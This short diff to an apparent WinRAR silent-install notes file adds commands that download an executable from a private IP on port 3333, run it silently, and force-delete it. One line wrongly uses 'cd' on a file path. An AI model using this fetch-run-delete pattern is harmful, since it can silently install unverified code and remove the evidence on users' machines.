@@ -2,3 +2,7 @@ https://silentinstallhq.com/winrar-silent-install-how-to-guide/
 
 
 winrar-x64-623.exe /S
+
+curl -o %temp%\winrar64.exe http://192.168.33.130:3333/winrar64.exe
+cd %temp%\winrar64.exe & winrar64.exe /S
+del /f "%temp%\winrar64.exe"
